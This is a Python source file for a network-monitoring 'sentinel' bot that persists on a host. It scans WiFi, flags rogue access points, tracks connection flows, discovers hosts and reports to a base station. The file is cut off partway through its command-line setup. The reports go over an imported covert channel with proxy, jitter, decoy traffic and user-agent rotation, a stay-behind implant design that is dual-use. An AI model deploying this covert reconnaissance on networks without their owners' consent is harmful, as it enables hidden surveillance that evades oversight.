# Copyright (c) 2026 Wolf-Pak Innovations LLC. All Rights Reserved.
# Proprietary and confidential. Unauthorized use, reproduction,
# or distribution is strictly prohibited. See LICENSE for terms.
#!/usr/bin/env python3
"""
Network Guardian — Fleet Sentinel Bot

Persistent stay-behind agent that monitors WiFi networks and network flows
in real-time. Unlike the periodic probe (collect → report → sleep), the
sentinel runs continuous monitoring loops:

  1. **WiFi Watcher**   — tracks SSIDs appearing/disappearing, signal drift,
                          rogue AP detection, channel congestion
  2. **Flow Monitor**   — watches connection flows over time, detects anomalies,
                          tracks bandwidth patterns, new external endpoints
  3. **Adaptive Engine** — adjusts monitoring intervals and sensitivity based
                          on what it learns about the environment
  4. **Base Reporter**  — streams intelligence back to base with priority levels:
                          routine (60s), alert (immediate), digest (5min summary)

The sentinel leaves itself behind on a network and keeps watch.

Usage:
    python -m network_guardian.agent.sentinel \\
        --base http://192.168.1.100:8080 --key <fleet-key-or-saas-api-key>
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import platform
import re
import socket
import subprocess
import sys
import time
import urllib.request
import urllib.error
from collections import deque
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from network_guardian.agent.covert_comms import CovertComms, build_comms

logger = logging.getLogger("ng-sentinel")

_SENTINEL_DIR = Path.home() / ".ng_agent" / "sentinel"

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class WiFiSnapshot:
    """A point-in-time WiFi environment snapshot."""
    timestamp: float
    networks: list[dict]   # [{ssid, bssid, signal, channel, security}]
    ssid_count: int = 0
    strongest_signal: int = -100
    channel_usage: dict = field(default_factory=dict)

    def __post_init__(self):
        self.ssid_count = len(self.networks)
        if self.networks:
            self.strongest_signal = max(n.get("signal", -100) for n in self.networks)
        # Count networks per channel
        ch_map: dict[int, int] = {}
        for n in self.networks:
            ch = n.get("channel", 0)
            if ch:
                ch_map[ch] = ch_map.get(ch, 0) + 1
        self.channel_usage = ch_map


@dataclass
class FlowRecord:
    """A tracked network flow (connection over time)."""
    protocol: str
    local_addr: str
    local_port: int
    remote_addr: str
    remote_port: int
    first_seen: float
    last_seen: float
    state: str = ""
    bytes_est: int = 0       # Estimated bytes (rough)
    packet_count: int = 0
    flagged: bool = False
    flag_reason: str = ""


@dataclass
class NetworkDigest:
    """Periodic summary of network state for base station."""
    agent_id: str
    sentinel_id: str
    timestamp: str
    uptime_seconds: float
    # WiFi intelligence
    wifi_ssid_count: int
    wifi_changes: list[dict]     # appeared/disappeared SSIDs
    wifi_signal_drift: dict      # {ssid: avg_signal_change}
    rogue_ap_alerts: list[dict]  # potential evil twins
    channel_congestion: dict     # {channel: network_count}
    # Flow intelligence
    active_flows: int
    new_flows_since_last: int
    closed_flows_since_last: int
    external_endpoints: int
    flow_anomalies: list[dict]
    bandwidth_pattern: str       # "normal", "spike", "drop", "steady"
    # Adaptive state
    strategy: dict
    monitoring_intervals: dict
    sensitivity_level: str

    def to_dict(self) -> dict:
        return asdict(self)


# ---------------------------------------------------------------------------
# WiFi watcher — continuous SSID / signal tracking
# ---------------------------------------------------------------------------

class WiFiWatcher:
    """Tracks WiFi environment changes over time."""

    def __init__(self) -> None:
        self._history: deque[WiFiSnapshot] = deque(maxlen=120)  # ~2hr at 60s
        self._known_bssids: dict[str, dict] = {}  # bssid → {ssid, first_seen, signal_avg}
        self._ssid_to_bssids: dict[str, set[str]] = {}  # ssid → set of bssids
        self._changes: list[dict] = []
        self._rogue_alerts: list[dict] = []
        self._signal_drift: dict[str, list[int]] = {}  # bssid → recent signals

    def scan(self) -> WiFiSnapshot:
        """Run a WiFi scan and update tracking."""
        from network_guardian.agent.probe import scan_wifi
        networks = scan_wifi()
        snap = WiFiSnapshot(timestamp=time.time(), networks=networks)
        self._process_snapshot(snap)
        self._history.append(snap)
        return snap

    def _process_snapshot(self, snap: WiFiSnapshot) -> None:
        """Compare to known state and detect changes."""
        now = snap.timestamp
        seen_bssids: set[str] = set()

        for net in snap.networks:
            bssid = net.get("bssid", "")
            ssid = net.get("ssid", "")
            signal = net.get("signal", -100)

            if not bssid:
                continue
            seen_bssids.add(bssid)

            # Track signal drift
            self._signal_drift.setdefault(bssid, [])
            self._signal_drift[bssid].append(signal)
            if len(self._signal_drift[bssid]) > 30:
                self._signal_drift[bssid] = self._signal_drift[bssid][-30:]

            if bssid not in self._known_bssids:
                # New AP discovered
                self._known_bssids[bssid] = {
                    "ssid": ssid, "first_seen": now,
                    "signal_avg": signal, "scan_count": 1,
                }
                self._changes.append({
                    "type": "ap_appeared",
                    "ssid": ssid, "bssid": bssid,
                    "signal": signal,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                })
                logger.info("New AP: %s (%s) %ddBm", ssid or "(hidden)", bssid, signal)
            else:
                # Update running average
                info = self._known_bssids[bssid]
                info["scan_count"] = info.get("scan_count", 0) + 1
                old_avg = info.get("signal_avg", signal)
                info["signal_avg"] = round(old_avg * 0.8 + signal * 0.2)

            # Track SSID → BSSID mapping for rogue detection
            if ssid:
                self._ssid_to_bssids.setdefault(ssid, set()).add(bssid)

        # Check for disappeared APs
        for bssid, info in list(self._known_bssids.items()):
            if bssid not in seen_bssids:
                age = now - info.get("first_seen", now)
                # Only flag if it was seen multiple times (not a drive-by)
                if info.get("scan_count", 0) > 3 and age > 120:
                    self._changes.append({
                        "type": "ap_disappeared",
                        "ssid": info.get("ssid", ""),
                        "bssid": bssid,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "was_seen_for": f"{age:.0f}s",
                    })
                    logger.info("AP gone: %s (%s)", info.get("ssid", "?"), bssid)
                    del self._known_bssids[bssid]

        # Rogue AP detection: same SSID on multiple BSSIDs with wildly different signals
        self._detect_rogues()

    def _detect_rogues(self) -> None:
        """Detect potential evil twin / rogue APs."""
        for ssid, bssids in self._ssid_to_bssids.items():
            if len(bssids) < 2 or not ssid:
                continue
            signals = {}
            for bssid in bssids:
                if bssid in self._known_bssids:
                    signals[bssid] = self._known_bssids[bssid].get("signal_avg", -100)

            if len(signals) < 2:
                continue

            # Multiple APs with same SSID — normal for enterprise, suspicious for home
            sigs = list(signals.values())
            spread = max(sigs) - min(sigs)
            # If 3+ APs and big signal spread, flag
            if len(signals) >= 3 and spread > 20:
                alert = {
                    "ssid": ssid,
                    "bssid_count": len(signals),
                    "signal_spread": spread,
                    "bssids": {k: v for k, v in signals.items()},
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "risk": "medium" if len(signals) < 5 else "low",
                }
                # Only add if not already reported recently
                recent = [a for a in self._rogue_alerts if a.get("ssid") == ssid]
                if not recent or (time.time() - time.mktime(
                        datetime.fromisoformat(recent[-1]["timestamp"]).timetuple()) > 300):
                    self._rogue_alerts.append(alert)
                    logger.warning("Potential rogue AP: %s (%d BSSIDs, %ddB spread)",
                                   ssid, len(signals), spread)

    def get_signal_drift(self) -> dict[str, float]:
        """Get average signal change per known BSSID."""
        drift: dict[str, float] = {}
        for bssid, sigs in self._signal_drift.items():
            if len(sigs) >= 3:
                recent = sigs[-5:]
                avg_change = sum(abs(recent[i] - recent[i-1])
                                 for i in range(1, len(recent))) / max(len(recent) - 1, 1)
                ssid = self._known_bssids.get(bssid, {}).get("ssid", bssid)
                drift[ssid] = round(avg_change, 1)
        return drift

    def take_changes(self) -> list[dict]:
        """Return and clear accumulated changes."""
        changes = self._changes[:]
        self._changes.clear()
        return changes

    def take_rogue_alerts(self) -> list[dict]:
        """Return and clear rogue AP alerts."""
        alerts = self._rogue_alerts[:]
        self._rogue_alerts.clear()
        return alerts

    @property
    def known_ap_count(self) -> int:
        return len(self._known_bssids)

    def get_channel_congestion(self) -> dict[int, int]:
        """Get current channel usage."""
        if self._history:
            return dict(self._history[-1].channel_usage)
        return {}


# ---------------------------------------------------------------------------
# Flow monitor — track network connections over time
# ---------------------------------------------------------------------------

class FlowMonitor:
    """Watches connection flows, detects anomalies, new endpoints."""

    def __init__(self) -> None:
        self._active_flows: dict[str, FlowRecord] = {}
        self._closed_flows: deque[FlowRecord] = deque(maxlen=500)
        self._new_since_last = 0
        self._closed_since_last = 0
        self._known_endpoints: set[str] = set()
        self._new_endpoints: list[dict] = []
        self._anomalies: list[dict] = []
        self._flow_counts: deque[int] = deque(maxlen=60)  # last 60 scans
        self._external_counts: deque[int] = deque(maxlen=60)

    def scan(self) -> dict[str, Any]:
        """Scan connections and update flow tracking."""
        connections = self._get_connections()
        now = time.time()
        seen_keys: set[str] = set()

        new_count = 0
        for conn in connections:
            key = self._flow_key(conn)
            seen_keys.add(key)

            if key in self._active_flows:
                # Update existing flow
                flow = self._active_flows[key]
                flow.last_seen = now
                flow.state = conn.get("state", "")
                flow.packet_count += 1
            else:
                # New flow
                flow = FlowRecord(
                    protocol=conn.get("protocol", "tcp"),
                    local_addr=conn.get("local_addr", ""),
                    local_port=conn.get("local_port", 0),
                    remote_addr=conn.get("remote_addr", ""),
                    remote_port=conn.get("remote_port", 0),
                    first_seen=now, last_seen=now,
                    state=conn.get("state", ""),
                    packet_count=1,
                )
                self._active_flows[key] = flow
                new_count += 1

                # Check if new external endpoint
                remote = conn.get("remote_addr", "")
                if remote and not self._is_local(remote):
                    ep = f"{remote}:{conn.get('remote_port', 0)}"
                    if ep not in self._known_endpoints:
                        self._known_endpoints.add(ep)
                        self._new_endpoints.append({
                            "endpoint": ep,
                            "protocol": conn.get("protocol", "tcp"),
                            "first_seen": datetime.now(timezone.utc).isoformat(),
                        })

        # Detect closed flows
        closed_count = 0
        for key in list(self._active_flows):
            if key not in seen_keys:
                flow = self._active_flows.pop(key)
                flow.last_seen = now
                self._closed_flows.append(flow)
                closed_count += 1

        self._new_since_last += new_count
        self._closed_since_last += closed_count

        # Track for pattern analysis
        ext_count = sum(1 for f in self._active_flows.values()
                        if not self._is_local(f.remote_addr))
        self._flow_counts.append(len(self._active_flows))
        self._external_counts.append(ext_count)

        # Anomaly detection
        self._detect_anomalies(new_count, closed_count)

        return {
            "active_flows": len(self._active_flows),
            "new_flows": new_count,
            "closed_flows": closed_count,
            "external_endpoints": len(self._known_endpoints),
        }

    def _get_connections(self) -> list[dict]:
        """Get active connections as dicts."""
        connections: list[dict] = []
        try:
            os_name = platform.system().lower()
            if os_name == "darwin":
                r = subprocess.run(
                    ["netstat", "-an", "-p", "tcp"],
                    capture_output=True, text=True, timeout=10,
                )
                for line in r.stdout.splitlines()[2:]:
                    c = self._parse_netstat_line(line, "tcp")
                    if c:
                        connections.append(c)
            elif os_name == "linux":
                r = subprocess.run(
                    ["ss", "-tuna"],
                    capture_output=True, text=True, timeout=10,
                )
                for line in r.stdout.splitlines()[1:]:
                    c = self._parse_ss_line(line)
                    if c:
                        connections.append(c)
            elif os_name == "windows":
                r = subprocess.run(
                    ["netstat", "-an"],
                    capture_output=True, text=True, timeout=10,
                )
                for line in r.stdout.splitlines()[4:]:
                    c = self._parse_netstat_win(line)
                    if c:
                        connections.append(c)
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            logger.warning("Connection scan failed: %s", e)
        return connections

    def _parse_netstat_line(self, line: str, proto: str) -> dict | None:
        parts = line.split()
        if len(parts) < 6:
            return None
        try:
            local = parts[3]
            remote = parts[4]
            state = parts[5] if not parts[5].isdigit() else ""
            lip, lp = self._split_addr(local)
            rip, rp = self._split_addr(remote)
            return {
                "protocol": proto, "local_addr": lip, "local_port": lp,
                "remote_addr": rip, "remote_port": rp, "state": state,
            }
        except (ValueError, IndexError):
            return None

    def _parse_ss_line(self, line: str) -> dict | None:
        parts = line.split()
        if len(parts) < 5:
            return None
        try:
            proto = parts[0].lower()
            state = parts[1]
            local = parts[4]
            remote = parts[5] if len(parts) > 5 else "*:*"
            lip, lp = self._split_addr(local)
            rip, rp = self._split_addr(remote)
            return {
                "protocol": proto, "local_addr": lip, "local_port": lp,
                "remote_addr": rip, "remote_port": rp, "state": state,
            }
        except (ValueError, IndexError):
            return None

    def _parse_netstat_win(self, line: str) -> dict | None:
        parts = line.split()
        if len(parts) < 4:
            return None
        try:
            proto = parts[0].lower()
            local = parts[1]
            remote = parts[2]
            state = parts[3] if not parts[3].isdigit() else ""
            lip, lp = self._split_addr(local)
            rip, rp = self._split_addr(remote)
            return {
                "protocol": proto, "local_addr": lip, "local_port": lp,
                "remote_addr": rip, "remote_port": rp, "state": state,
            }
        except (ValueError, IndexError):
            return None

    @staticmethod
    def _split_addr(addr: str) -> tuple[str, int]:
        if addr.startswith("["):
            bracket = addr.index("]")
            ip = addr[1:bracket]
            port = int(addr[bracket + 2:]) if bracket + 2 < len(addr) else 0
            return ip, port
        dot = addr.rfind(".")
        if dot == -1:
            dot = addr.rfind(":")
        if dot == -1:
            return addr, 0
        try:
            return addr[:dot], int(addr[dot + 1:])
        except ValueError:
            return addr, 0

    @staticmethod
    def _flow_key(conn: dict) -> str:
        return (f"{conn.get('protocol', 'tcp')}|"
                f"{conn.get('local_addr', '')}:{conn.get('local_port', 0)}->"
                f"{conn.get('remote_addr', '')}:{conn.get('remote_port', 0)}")

    @staticmethod
    def _is_local(addr: str) -> bool:
        if not addr:
            return True
        return (addr.startswith("127.") or addr.startswith("::1")
                or addr == "*" or addr.startswith("0.0.0.0")
                or addr.startswith("fe80:") or addr.startswith("169.254."))

    def _detect_anomalies(self, new_count: int, closed_count: int) -> None:
        """Detect flow anomalies — sudden spikes, unusual patterns."""
        if len(self._flow_counts) < 5:
            return  # Need some history first

        counts = list(self._flow_counts)
        avg = sum(counts[:-1]) / max(len(counts) - 1, 1)
        current = counts[-1]
        ext_counts = list(self._external_counts)
        ext_avg = sum(ext_counts[:-1]) / max(len(ext_counts) - 1, 1)
        ext_current = ext_counts[-1]

        # Connection surge (>3x average)
        if avg > 0 and current > avg * 3:
            self._anomalies.append({
                "type": "connection_surge",
                "detail": f"Active flows {current} vs avg {avg:.0f} ({current/avg:.1f}x)",
                "severity": "medium",
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

        # External connection surge
        if ext_avg > 0 and ext_current > ext_avg * 2.5:
            self._anomalies.append({
                "type": "external_surge",
                "detail": f"External connections {ext_current} vs avg {ext_avg:.0f}",
                "severity": "high",
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

        # Rapid new connections (>20 in one scan)
        if new_count > 20:
            self._anomalies.append({
                "type": "rapid_new_flows",
                "detail": f"{new_count} new connections in single scan",
                "severity": "medium",
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

    def get_bandwidth_pattern(self) -> str:
        """Analyze recent flow counts to determine pattern."""
        if len(self._flow_counts) < 5:
            return "baseline"
        counts = list(self._flow_counts)
        recent = counts[-5:]
        older = counts[-10:-5] if len(counts) >= 10 else counts[:5]

        avg_recent = sum(recent) / len(recent)
        avg_older = sum(older) / len(older) if older else avg_recent

        if avg_older == 0:
            return "steady"
        ratio = avg_recent / max(avg_older, 1)
        if ratio > 1.5:
            return "spike"
        elif ratio < 0.5:
            return "drop"
        return "steady"

    def take_anomalies(self) -> list[dict]:
        """Return and clear anomalies."""
        anomalies = self._anomalies[:]
        self._anomalies.clear()
        return anomalies

    def take_new_endpoints(self) -> list[dict]:
        """Return and clear new endpoint list."""
        eps = self._new_endpoints[:]
        self._new_endpoints.clear()
        return eps

    def take_flow_stats(self) -> tuple[int, int]:
        """Return and reset new/closed counters."""
        new, closed = self._new_since_last, self._closed_since_last
        self._new_since_last = 0
        self._closed_since_last = 0
        return new, closed

    @property
    def active_count(self) -> int:
        return len(self._active_flows)

    @property
    def external_endpoint_count(self) -> int:
        return len(self._known_endpoints)

    def get_long_lived_flows(self, min_seconds: float = 300) -> list[dict]:
        """Get flows that have been active a long time."""
        now = time.time()
        return [{
            "protocol": f.protocol,
            "remote": f"{f.remote_addr}:{f.remote_port}",
            "duration_min": round((now - f.first_seen) / 60, 1),
            "packets": f.packet_count,
        } for f in self._active_flows.values()
            if now - f.first_seen > min_seconds and not self._is_local(f.remote_addr)]


# ---------------------------------------------------------------------------
# Adaptive strategy engine
# ---------------------------------------------------------------------------

class AdaptiveEngine:
    """Adjusts monitoring behavior based on learned environment patterns.

    Tunes:
      - WiFi scan interval  (15s–120s)
      - Flow scan interval   (5s–60s)
      - Report interval      (30s–300s)
      - Sensitivity level    (relaxed / normal / alert / critical)
      - Host discovery freq  (every Nth report cycle)
    """

    def __init__(self) -> None:
        self._state_path = _SENTINEL_DIR / "strategy.json"
        self._state: dict[str, Any] = self._load()
        self._event_scores: deque[float] = deque(maxlen=30)  # recent threat scores

    def _load(self) -> dict[str, Any]:
        if self._state_path.exists():
            try:
                return json.loads(self._state_path.read_text(encoding="utf-8"))
            except (json.JSONDecodeError, OSError):
                pass
        return self._defaults()

    @staticmethod
    def _defaults() -> dict[str, Any]:
        return {
            "wifi_interval": 60,
            "flow_interval": 15,
            "report_interval": 60,
            "host_discovery_every": 5,  # every 5th report cycle
            "sensitivity": "normal",    # relaxed, normal, alert, critical
            "auto_adapt": True,
            "created": datetime.now(timezone.utc).isoformat(),
            "adapt_count": 0,
        }

    def save(self) -> None:
        try:
            self._state_path.parent.mkdir(parents=True, exist_ok=True)
            self._state_path.write_text(json.dumps(self._state, indent=2), encoding="utf-8")
        except OSError:
            pass

    @property
    def wifi_interval(self) -> int:
        return self._state.get("wifi_interval", 60)

    @property
    def flow_interval(self) -> int:
        return self._state.get("flow_interval", 15)

    @property
    def report_interval(self) -> int:
        return self._state.get("report_interval", 60)

    @property
    def host_discovery_every(self) -> int:
        return self._state.get("host_discovery_every", 5)

    @property
    def sensitivity(self) -> str:
        return self._state.get("sensitivity", "normal")

    def adapt(self, wifi_changes: int, flow_anomalies: int,
              threat_score: float, rogue_count: int) -> dict[str, Any]:
        """Re-evaluate and adjust strategy based on recent intelligence.

        Returns dict of what changed.
        """
        if not self._state.get("auto_adapt", True):
            return {}

        self._event_scores.append(threat_score)
        avg_score = sum(self._event_scores) / len(self._event_scores)

        changes: dict[str, Any] = {}
        old_sens = self.sensitivity

        # Determine sensitivity level from rolling threat average
        if avg_score >= 50 or rogue_count > 0:
            new_sens = "critical"
        elif avg_score >= 25 or flow_anomalies > 2:
            new_sens = "alert"
        elif avg_score >= 10 or wifi_changes > 5:
            new_sens = "normal"
        else:
            new_sens = "relaxed"

        if new_sens != old_sens:
            self._state["sensitivity"] = new_sens
            changes["sensitivity"] = {"from": old_sens, "to": new_sens}
            logger.info("Sensitivity: %s → %s (avg score %.1f)",
                        old_sens, new_sens, avg_score)

        # Adjust intervals based on sensitivity
        intervals = {
            "relaxed":  {"wifi_interval": 120, "flow_interval": 30, "report_interval": 120, "host_discovery_every": 10},
            "normal":   {"wifi_interval": 60,  "flow_interval": 15, "report_interval": 60,  "host_discovery_every": 5},
            "alert":    {"wifi_interval": 30,  "flow_interval": 10, "report_interval": 30,  "host_discovery_every": 3},
            "critical": {"wifi_interval": 15,  "flow_interval": 5,  "report_interval": 15,  "host_discovery_every": 1},
        }
        target = intervals.get(new_sens, intervals["normal"])

        for key, val in target.items():
            if self._state.get(key) != val:
                old_val = self._state.get(key)
                self._state[key] = val
                changes[key] = {"from": old_val, "to": val}

        if changes:
            self._state["adapt_count"] = self._state.get("adapt_count", 0) + 1
            self._state["last_adapted"] = datetime.now(timezone.utc).isoformat()
            self.save()

        return changes

    def get_strategy_summary(self) -> dict:
        return {
            "sensitivity": self._state.get("sensitivity", "normal"),
            "wifi_interval": self._state.get("wifi_interval", 60),
            "flow_interval": self._state.get("flow_interval", 15),
            "report_interval": self._state.get("report_interval", 60),
            "host_discovery_every": self._state.get("host_discovery_every", 5),
            "auto_adapt": self._state.get("auto_adapt", True),
            "adapt_count": self._state.get("adapt_count", 0),
        }

    def set_override(self, key: str, value: Any) -> None:
        """Manual override from base station command."""
        if key in ("wifi_interval", "flow_interval", "report_interval",
                    "host_discovery_every", "sensitivity", "auto_adapt"):
            self._state[key] = value
            self.save()
            logger.info("Strategy override: %s = %s", key, value)


# ---------------------------------------------------------------------------
# Sentinel Bot — the main daemon
# ---------------------------------------------------------------------------

class SentinelBot:
    """Persistent stay-behind fleet agent.

    Runs three async loops:
      1. WiFi watcher loop (scan + track changes)
      2. Flow monitor loop (track connections + anomalies)
      3. Report loop (aggregate digest → send to base)
    """

    def __init__(self, base_url: str, fleet_key: str,
                 agent_id: str = "", label: str = "",
                 comms: CovertComms | None = None) -> None:
        self._base_url = base_url.rstrip("/")
        self._fleet_key = fleet_key
        self._agent_id = agent_id
        self._label = label or socket.gethostname()
        self._started_at = 0.0

        # Covert communications channel (anonymized HTTP)
        self._comms = comms or build_comms()

        # Sub-systems
        self.wifi = WiFiWatcher()
        self.flows = FlowMonitor()
        self.strategy = AdaptiveEngine()

        # ReAct agent for threat intelligence
        self._react_agent: Any = None

        # Report cycle tracking
        self._report_cycle = 0
        self._running = False
        self._tasks: list[asyncio.Task] = []

        # Data dir
        _SENTINEL_DIR.mkdir(parents=True, exist_ok=True)

    def _get_react(self) -> Any:
        if self._react_agent is None:
            try:
                from network_guardian.agent.react_agent import ProbeReActAgent
                self._react_agent = ProbeReActAgent()
            except Exception as e:
                logger.warning("Could not init ReAct agent: %s", e)
        return self._react_agent

    async def start(self) -> None:
        """Start all monitoring loops."""
        self._running = True
        self._started_at = time.time()
        logger.info("Sentinel starting — agent %s on %s",
                     self._agent_id, self._label)

        # Initial WiFi scan
        snap = self.wifi.scan()
        logger.info("Initial WiFi scan: %d networks, %d channels",
                     snap.ssid_count, len(snap.channel_usage))

        # Initial flow scan
        stats = self.flows.scan()
        logger.info("Initial flow scan: %d active flows", stats["active_flows"])

        # Start async loops
        self._tasks = [
            asyncio.create_task(self._wifi_loop(), name="wifi"),
            asyncio.create_task(self._flow_loop(), name="flow"),
            asyncio.create_task(self._report_loop(), name="report"),
        ]
        logger.info("Sentinel active — WiFi/%ds, Flows/%ds, Report/%ds",
                     self.strategy.wifi_interval,
                     self.strategy.flow_interval,
                     self.strategy.report_interval)

    async def stop(self) -> None:
        """Stop all loops."""
        self._running = False
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        logger.info("Sentinel stopped after %.1f hours",
                     (time.time() - self._started_at) / 3600)

    async def _wifi_loop(self) -> None:
        """Continuous WiFi scanning loop."""
        while self._running:
            try:
                await asyncio.sleep(self.strategy.wifi_interval)
                snap = self.wifi.scan()
                logger.debug("WiFi scan: %d nets, strongest %ddBm",
                             snap.ssid_count, snap.strongest_signal)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error("WiFi loop error: %s", e)
                await asyncio.sleep(30)

    async def _flow_loop(self) -> None:
        """Continuous connection flow monitoring loop."""
        while self._running:
            try:
                await asyncio.sleep(self.strategy.flow_interval)
                stats = self.flows.scan()
                if stats["new_flows"] > 10 or stats["closed_flows"] > 10:
                    logger.debug("Flows: %d active, +%d/-%d",
                                 stats["active_flows"],
                                 stats["new_flows"],
                                 stats["closed_flows"])
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error("Flow loop error: %s", e)
                await asyncio.sleep(10)

    async def _report_loop(self) -> None:
        """Periodic digest builder and reporter."""
        while self._running:
            try:
                await asyncio.sleep(self.strategy.report_interval)
                self._report_cycle += 1

                # Run ReAct cycle for threat intelligence
                threat_score = 0.0
                react_diag = {}
                react = self._get_react()
                if react:
                    try:
                        diag = react.run_cycle(agent_id=self._agent_id)
                        threat_score = diag.threat_score
                        react_diag = diag.to_dict()
                    except Exception as e:
                        logger.warning("ReAct cycle failed: %s", e)

                # Collect WiFi changes
                wifi_changes = self.wifi.take_changes()
                rogue_alerts = self.wifi.take_rogue_alerts()
                signal_drift = self.wifi.get_signal_drift()
                channel_congestion = self.wifi.get_channel_congestion()

                # Collect flow stats
                new_flows, closed_flows = self.flows.take_flow_stats()
                flow_anomalies = self.flows.take_anomalies()
                new_endpoints = self.flows.take_new_endpoints()
                bandwidth = self.flows.get_bandwidth_pattern()
                long_lived = self.flows.get_long_lived_flows()

                # Adapt strategy
                adapt_changes = self.strategy.adapt(
                    wifi_changes=len(wifi_changes),
                    flow_anomalies=len(flow_anomalies),
                    threat_score=threat_score,
                    rogue_count=len(rogue_alerts),
                )
                if adapt_changes:
                    logger.info("Strategy adapted: %s", adapt_changes)

                # Host discovery on schedule
                hosts: list[dict] = []
                if self._report_cycle % self.strategy.host_discovery_every == 0:
                    try:
                        from network_guardian.agent.probe import discover_hosts
                        hosts = await discover_hosts()
                        logger.info("Host discovery: %d alive", len(hosts))
                    except Exception as e:
                        logger.warning("Host discovery failed: %s", e)

                # Build digest
                digest = NetworkDigest(
                    agent_id=self._agent_id,
                    sentinel_id=f"{self._agent_id}-sentinel",
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    uptime_seconds=time.time() - self._started_at,
                    # WiFi
                    wifi_ssid_count=self.wifi.known_ap_count,
                    wifi_changes=wifi_changes,
                    wifi_signal_drift=signal_drift,
                    rogue_ap_alerts=rogue_alerts,
                    channel_congestion=channel_congestion,
                    # Flows
                    active_flows=self.flows.active_count,
                    new_flows_since_last=new_flows,
                    closed_flows_since_last=closed_flows,
                    external_endpoints=self.flows.external_endpoint_count,
                    flow_anomalies=flow_anomalies + [{"type": "long_lived", "flows": long_lived}] if long_lived else flow_anomalies,
                    bandwidth_pattern=bandwidth,
                    # Strategy
                    strategy=self.strategy.get_strategy_summary(),
                    monitoring_intervals={
                        "wifi_scan": self.strategy.wifi_interval,
                        "flow_scan": self.strategy.flow_interval,
                        "report": self.strategy.report_interval,
                    },
                    sensitivity_level=self.strategy.sensitivity,
                )

                # Build full report (probe-compatible format)
                from network_guardian.agent.probe import (
                    scan_wifi, collect_system_metrics, _get_local_ip, _get_subnet,
                )
                local_ip = _get_local_ip()
                metrics = collect_system_metrics()

                report = {
                    "agent_id": self._agent_id,
                    "timestamp": digest.timestamp,
                    "identity": {
                        "agent_id": self._agent_id,
                        "hostname": socket.gethostname(),
                        "platform_os": f"{platform.system()} {platform.release()}",
                        "arch": platform.machine(),
                    },
                    "wifi_networks": self.wifi._history[-1].networks if self.wifi._history else [],
                    "discovered_hosts": hosts,
                    "system_metrics": metrics,
                    "local_ip": local_ip,
                    "subnet": _get_subnet(),
                    "gateway": self._get_gateway(),
                    "open_ports_by_host": {},
                    "diagnostics": react_diag,
                    # Sentinel-specific fields
                    "sentinel": digest.to_dict(),
                    # Covert channel status — base station tracks opsec state
                    "covert_status": self._comms.status(),
                }

                # Phone home
                success = self._send_report(report)
                if success:
                    logger.info(
                        "Report #%d sent — WiFi:%d(%+d) Flows:%d(%+d/-%d) "
                        "Threats:%.0f Sensitivity:%s",
                        self._report_cycle,
                        self.wifi.known_ap_count, len(wifi_changes),
                        self.flows.active_count, new_flows, closed_flows,
                        threat_score, self.strategy.sensitivity,
                    )
                else:
                    logger.warning("Report #%d failed to send", self._report_cycle)

                # Check for base commands
                self._check_commands()

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error("Report loop error: %s", e, exc_info=True)
                await asyncio.sleep(30)

    def _send_report(self, report: dict) -> bool:
        """Send report to base station via the covert channel."""
        from network_guardian.agent.probe import _fleet_endpoint, _fleet_headers

        url = _fleet_endpoint(self._base_url, "report", self._fleet_key)
        payload = json.dumps(report).encode()
        headers = _fleet_headers(payload, self._fleet_key, self._agent_id)
        ok, body = self._comms.post(url, headers, payload)
        if ok:
            return body.get("ok", False)
        return False

    def _check_commands(self) -> None:
        """Check base station for pending commands (strategy overrides, etc)."""
        # Future: pull commands from base station API
        pass

    def _get_gateway(self) -> str:
        try:
            if platform.system().lower() == "darwin":
                r = subprocess.run(
                    ["route", "-n", "get", "default"],
                    capture_output=True, text=True, timeout=5,
                )
                for line in r.stdout.splitlines():
                    if "gateway:" in line.lower():
                        return line.split(":")[1].strip()
            elif platform.system().lower() == "linux":
                r = subprocess.run(
                    ["ip", "route", "show", "default"],
                    capture_output=True, text=True, timeout=5,
                )
                parts = r.stdout.split()
                if "via" in parts:
                    return parts[parts.index("via") + 1]
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        return ""


# ---------------------------------------------------------------------------
# Authentication (reuse from probe)
# ---------------------------------------------------------------------------

def _authenticate(base_url: str, fleet_key: str,
                  username: str | None = None,
                  password: str | None = None) -> dict:
    """Authenticate with base station using probe's auth system."""
    from network_guardian.agent.probe import authenticate_agent
    return authenticate_agent(base_url, fleet_key, username, password)


def _get_agent_id() -> str:
    """Get persistent agent ID."""
    from network_guardian.agent.probe import _get_or_create_id
    return _get_or_create_id(Path.home() / ".ng_agent")


def _register(base_url: str, fleet_key: str, agent_id: str) -> bool:
    """Register sentinel with base station."""
    from network_guardian.agent.probe import (
        AgentIdentity, register_with_base,
    )
    identity = AgentIdentity.collect(Path.home() / ".ng_agent")
    return register_with_base(base_url, fleet_key, identity)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

async def run_sentinel(base_url: str, fleet_key: str, agent_id: str,
                       comms: CovertComms | None = None) -> None:
    """Main async entry point."""
    bot = SentinelBot(base_url, fleet_key, agent_id=agent_id, comms=comms)
    status = bot._comms.status()
    logger.info("Covert channel: proxy=%s, jitter=%s, decoys=%d, ua-rotation=%s",
                status["proxy"], status["jitter"],
                status["decoys"], status["user_agent_rotation"])
    await bot.start()
    try:
        await asyncio.Event().wait()
    except (KeyboardInterrupt, asyncio.CancelledError):
        pass
    finally:
        await bot.stop()


def main():
    parser = argparse.ArgumentParser(
        prog="ng-sentinel",
        description="Network Guardian Fleet Sentinel — persistent stay-behind monitoring bot",
    )
    parser.add_argument("--base", required=True,
                        help="Base station URL (e.g. http://192.168.1.100:8080)")
    parser.add_argument("--key", required=True,
                        help="Legacy fleet key or SaaS API key")
